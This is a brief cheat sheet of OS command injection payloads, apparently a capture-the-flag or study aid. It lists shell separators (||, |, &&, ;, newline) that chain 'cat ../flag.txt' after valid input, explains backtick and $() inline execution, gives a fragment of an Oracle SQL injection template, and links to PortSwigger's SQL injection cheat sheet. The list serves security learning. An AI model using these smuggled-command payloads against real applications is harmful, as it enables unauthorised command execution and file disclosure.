OS Injection
* [valid input] || cat ../flag.txt
* [valid input] | cat ../flag.txt
* [valid input] && cat ../flag.txt
* [valid input] & cat ../flag.txt
* [valid input] ; cat ../flag.txt
* [valid input] 0x0a cat ../flag.txt [Unix]
* [valid input] \n cat ../flag.txt
On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

* Use ` or $ for inline injection on UNIX eg. $(injected command) or start and end command with `
...
* Oracle:     SELECT [input] FROM all_tables 
...
See also [Portswigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
